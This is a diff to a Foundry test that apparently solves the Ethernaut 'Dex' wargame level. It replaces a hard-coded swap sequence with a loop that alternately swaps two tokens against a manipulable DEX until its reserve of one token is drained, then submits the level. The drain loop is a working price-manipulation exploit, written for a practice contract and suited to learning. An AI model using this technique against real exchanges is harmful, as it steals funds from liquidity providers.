@@ -36,53 +36,48 @@ contract DexAttackTest is PRBTest {
 
     // test with withrawPartner set directly
     function testDexAttack() public {
-         uint tokenBalance;
+        uint256 tokenBalance;
+        uint256 exchangeBalance;
+        bool toggle;
+        bool drained;
+
         vm.startPrank(playerAddress, playerAddress);
 
-        tokenBalance = SwappableToken(token1).balanceOf(playerAddress);
-        swapToken(token1, token2, tokenBalance);
-        tokenBalance = SwappableToken(token2).balanceOf(playerAddress);
-        swapToken(token2, token1, tokenBalance);
-        tokenBalance = SwappableToken(token1).balanceOf(playerAddress);
-        swapToken(token1, token2, tokenBalance);
-        tokenBalance = SwappableToken(token2).balanceOf(playerAddress);
-        swapToken(token2, token1, tokenBalance);
-        tokenBalance = SwappableToken(token1).balanceOf(playerAddress);
-        swapToken(token1, token2, tokenBalance);
-        tokenBalance = SwappableToken(token2).balanceOf(playerAddress);
-        swapToken(token2, token1, tokenBalance);
-        tokenBalance = SwappableToken(token1).balanceOf(playerAddress);
-        swapToken(token1, token2, tokenBalance);
-        tokenBalance = SwappableToken(token2).balanceOf(playerAddress);
-        swapToken(token2, token1, tokenBalance);
-        // attacker.attack(dexInstance);
-        // uint myToken1Balance = SwappableToken(token1).balanceOf(playerAddress);
-        // SwappableToken(token1).approve(playerAddress, dexInstance, myToken1Balance);
-        // console.log("MY TOKEN1 BALANCE BEFORE:", myToken1Balance);
-        // Dex(dexInstance).swap(token1, token2, myToken1Balance);
-        // myToken1Balance = SwappableToken(token1).balanceOf(playerAddress);
-        // console.log("MY TOKEN1 BALANCE AFTER:", myToken1Balance);
-        // console.log("MY TOKEN1 PRICE AFTER:", Dex(dexInstance).getSwapPrice(token1, token2, 10));
+        while (!drained) {
+            toggle ? swapToken(token1, token2) : swapToken(token2, token1);
+            toggle = !toggle;
+            drained = isDexDrained();
+        }
 
-
-
-
-        // // test to make sure we completed the level
-        // vm.startPrank(playerAddress, playerAddress);
-        // // submit level as player
-        // bool levelComplete = ethernaut.submitLevelInstance(payable(dexInstance));
-        // assert(levelComplete);
-        // vm.stopPrank();
+        // test to make sure we completed the level; submit level as player
+        bool levelComplete = ethernaut.submitLevelInstance(payable(dexInstance));
+        assert(levelComplete);
+        vm.stopPrank();
     }
 
-    function swapToken(address _tokenFrom, address _tokenTo, uint _amount) public {
-        uint myTokenBalance = SwappableToken(_tokenFrom).balanceOf(playerAddress);
-        SwappableToken(_tokenFrom).approve(playerAddress, dexInstance, _amount);
-        console.log("MY TOKEN BALANCE BEFORE:", myTokenBalance);
-        Dex(dexInstance).swap(_tokenFrom, _tokenTo, _amount);
+    function swapToken(address _tokenFrom, address _tokenTo) public {
+        require(
+            SwappableToken(token1).balanceOf(dexInstance) > 0 && SwappableToken(token2).balanceOf(dexInstance) > 0,
+            "Token Drained"
+        );
+        // get my balance and the exchange balance
+        uint256 myTokenBalance = SwappableToken(_tokenFrom).balanceOf(playerAddress);
+        uint256 exchangeBalance = SwappableToken(_tokenFrom).balanceOf(dexInstance);
+
+        // determine how much to swap
+        uint256 swapAmount;
+        myTokenBalance >= exchangeBalance ? swapAmount = exchangeBalance : swapAmount = myTokenBalance;
+
+        SwappableToken(_tokenFrom).approve(playerAddress, dexInstance, swapAmount);
+        console.log("DEX TOKEN 1 BALANCE BEFORE:", SwappableToken(token1).balanceOf(dexInstance));
+        console.log("DEX TOKEN 2 BALANCE BEFORE:", SwappableToken(token2).balanceOf(dexInstance));
+        Dex(dexInstance).swap(_tokenFrom, _tokenTo, swapAmount);
         myTokenBalance = SwappableToken(_tokenFrom).balanceOf(playerAddress);
-        console.log("MY TOKEN BALANCE AFTER:", myTokenBalance);
-        console.log("MY TOKEN PRICE AFTER:", Dex(dexInstance).getSwapPrice(_tokenFrom, _tokenTo, _amount));
+        console.log("DEX TOKEN 1 BALANCE AFTER:", SwappableToken(token1).balanceOf(dexInstance));
+        console.log("DEX TOKEN 2 BALANCE AFTER:", SwappableToken(token2).balanceOf(dexInstance));
     }
 
+    function isDexDrained() public returns (bool) {
+        return SwappableToken(token1).balanceOf(dexInstance) == 0 || SwappableToken(token2).balanceOf(dexInstance) == 0;
+    }
 }
